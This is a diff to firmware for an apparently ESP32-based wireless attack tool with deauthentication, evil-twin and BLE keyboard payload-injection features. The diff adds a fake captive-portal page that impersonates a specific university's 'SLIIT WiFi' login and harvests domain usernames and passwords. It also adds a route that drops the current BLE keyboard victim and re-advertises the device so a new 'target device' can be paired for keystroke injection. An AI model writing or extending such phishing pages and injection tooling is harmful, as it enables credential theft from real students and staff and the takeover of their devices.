@@ -44,6 +44,7 @@ int spamCount = 0;
 uint32_t deauthPktsSent = 0;
 uint32_t totalPacketsCaptured = 0;
 uint8_t eapolFramesDetected = 0;
+uint16_t captureDownloadCount = 0;  // sequential capture file numbering
 
 /* ============ PAYLOAD INJECTOR (BLE HID KEYBOARD) ============ */
 String bleDeviceName = "ZeNeOn";  // user-configurable BLE device name
@@ -650,6 +651,7 @@ String evilUI() {
 <option value="1">Google Sign-In</option>
 <option value="2">Facebook Login</option>
 <option value="3">Microsoft Account</option>
+<option value="4">SLIIT WiFi Login</option>
 </select>
 <button onclick="startEvil()">Launch Evil Twin</button>
 <button class="danger" onclick="stopEvil()">Stop Evil Twin</button>
@@ -970,6 +972,41 @@ body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify
 <button type="submit" class="btn">Sign in</button>
 </form>
 <div class="ft">No account? <a href="#" style="color:#0067b8;text-decoration:none" onclick="return false">Create one!</a></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+
+    case 4: // SLIIT WiFi Login
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Sign in to SLIIT-STD</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Helvetica,Arial,sans-serif}
+body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.box{width:100%;max-width:500px;padding:40px;position:relative}
+.logo{margin-bottom:20px}
+.logo img{height:60px}
+.title{font-size:28px;font-weight:300;color:#555;margin-bottom:16px;letter-spacing:-0.5px}
+.title span{font-weight:300}
+.auth{font-size:20px;font-weight:700;color:#333;margin-bottom:8px}
+.desc{font-size:14px;color:#666;margin-bottom:24px}
+.fg{margin-bottom:14px;display:flex;align-items:center}
+.fg label{width:90px;font-size:14px;color:#333;font-weight:400}
+.fg input{flex:1;padding:6px 8px;border:1px solid #ccc;font-size:14px;color:#333}
+.fg input:focus{outline:none;border-color:#5b9bd5}
+.btn{padding:8px 24px;background:#337ab7;color:#fff;border:1px solid #2e6da4;border-radius:4px;font-size:14px;font-weight:400;cursor:pointer;margin-top:8px;margin-left:90px}
+.btn:hover{background:#286090;border-color:#204d74}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="logo"><img src="data:image/png;base64,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" alt="SLIIT UNI"></div>
+<div class="title">SLIIT WIFI FOR BYOD</div>
+<div class="auth">Authentication Required</div>
+<div class="desc">Please enter your SLIIT domain credential to continue.</div>
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><label>Username</label><input type="text" id="u" name="username" required></div>
+<div class="fg"><label>Password</label><input type="password" id="p" name="password" required></div>
+<button type="submit" class="btn">Continue</button>
+</form>
 </div>)rawliteral" + submitJS + "</body></html>";
 
     default: // Generic WiFi Login (template 0)
@@ -2132,6 +2169,7 @@ String payloadInjectorUI() {
 <button class="success" onclick="startBLE()" id="startBtn">Start BLE Keyboard</button>
 <button class="danger" onclick="stopBLE()" id="stopBtn">Stop BLE Keyboard</button>
 </div>
+<button class="secondary" onclick="disconnectBLE()" id="disconnBtn" style="margin-top:8px;width:100%">Disconnect Current Device</button>
 </div>
 
 <div class="card" id="payloadCard">
@@ -2260,6 +2298,25 @@ var stopBLE=function(){
     document.getElementById('bleStatus').innerHTML='BLE Keyboard stopped.';
     document.getElementById('bleName').disabled=false;
     addExecLog('BLE Keyboard stopped','#ff4444');
+  });
+}
+var disconnectBLE=function(){
+  document.getElementById('disconnBtn').disabled=true;
+  document.getElementById('disconnBtn').textContent='Disconnecting...';
+  addExecLog('Disconnecting current BLE device...','#ffaa00');
+  fetch('/payload/disconnect').then(r=>r.json()).then(d=>{
+    document.getElementById('disconnBtn').disabled=false;
+    document.getElementById('disconnBtn').textContent='Disconnect Current Device';
+    if(d.ok){
+      document.getElementById('bleStatus').className='status warning';
+      document.getElementById('bleStatus').innerHTML='Device disconnected — re-advertising as <strong>"'+document.getElementById('bleName').value.trim()+'"</strong>. Pair the target device now.';
+      addExecLog('Disconnected! Ready to pair new device.','#00ff88');
+    } else {
+      addExecLog(d.msg,'#ff4444');
+    }
+  }).catch(function(){
+    document.getElementById('disconnBtn').disabled=false;
+    document.getElementById('disconnBtn').textContent='Disconnect Current Device';
   });
 }
 var startBlePoll=function(){
@@ -2712,7 +2769,8 @@ void setupRoutes() {
       server.send(500, "text/plain", "Failed to open file");
       return;
     }
-    String filename = "capture_" + String(millis() / 1000) + ".pcap";
+    captureDownloadCount++;
+    String filename = "capture_" + String(captureDownloadCount) + ".pcap";
     size_t fileSize = f.size();
     server.sendHeader("Content-Disposition",
                       "attachment; filename=" + filename);
@@ -2965,6 +3023,27 @@ void setupRoutes() {
     addEvent("PAYLOAD: BLE Keyboard started");
     String startResp = "{\"ok\":true,\"msg\":\"BLE Keyboard started — look for '" + bleDeviceName + "' in Bluetooth settings\"}";
     server.send(200, "application/json", startResp);
+  });
+
+  server.on("/payload/disconnect", []() {
+    if (!bleKbStarted) {
+      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"BLE Keyboard not started\"}");
+      return;
+    }
+    Serial.println("[PAYLOAD] Disconnect requested — performing clean restart");
+    addEvent("PAYLOAD: Disconnect — clean BLE restart");
+    bleKeyboard.releaseAll();
+    bleCleanRestart();
+    bleKbStarted = true;  // keep it started (re-advertising)
+    bleWasConnected = false;
+    bleLastConnChange = millis();
+    bleReconnectCount = 0;
+    bleReconnectWindowStart = millis();
+    payloadStatus = "idle";
+    payloadExecuting = false;
+    payloadBuffer = "";
+    String resp = "{\"ok\":true,\"msg\":\"Disconnected — re-advertising as '" + bleDeviceName + "'\"}";
+    server.send(200, "application/json", resp);
   });
 
   server.on("/payload/stop", []() {
